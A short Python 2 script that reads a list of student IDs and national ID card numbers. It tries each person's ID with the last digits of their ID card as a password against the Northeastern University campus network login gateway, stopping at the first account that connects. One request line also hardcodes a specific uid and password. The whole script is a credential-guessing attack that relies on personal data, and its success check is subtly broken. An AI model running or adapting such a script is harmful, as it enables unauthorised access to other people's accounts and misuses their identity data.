# -*- coding: utf-8 -*
import sys,re
reload(sys)
sys.setdefaultencoding( "utf-8" )
import json
filehandler = open('namelist.txt','r')
a = filehandler.read()
filehandler.close()
j =json.loads(a)

def ran():
    import random
    return str(random.randint(1000000000000000000, 2999999999999999999))

def WebView(urls,data):
    import urllib2
    req = urllib2.Request(urls,data)
    web=urllib2.urlopen(req)
    return web.read().decode('gbk').encode('utf-8')

for e in j['data']:
    name = e['id']
    mm = e ['idcard'][12:]
    print name,mm,
    # ff=WebView('http://ipgw.neu.edu.cn/ipgw/ipgw.ipgw','uid='+name+'&password='+mm+'&operation=connect&range=2&timeout=1')
    ff=WebView('http://ipgw.neu.edu.cn/ipgw/ipgw.ipgw','uid=20154469&password=606128&operation=connect&range=2&timeout=1')
    # print ff
    print re.findall(r'REASON=(.+?)IPGWCLIENT',ff)[0]
    if re.search(ff,'您预设的连接数'):
        print 'success'
        break
    else:
        print 'fail'
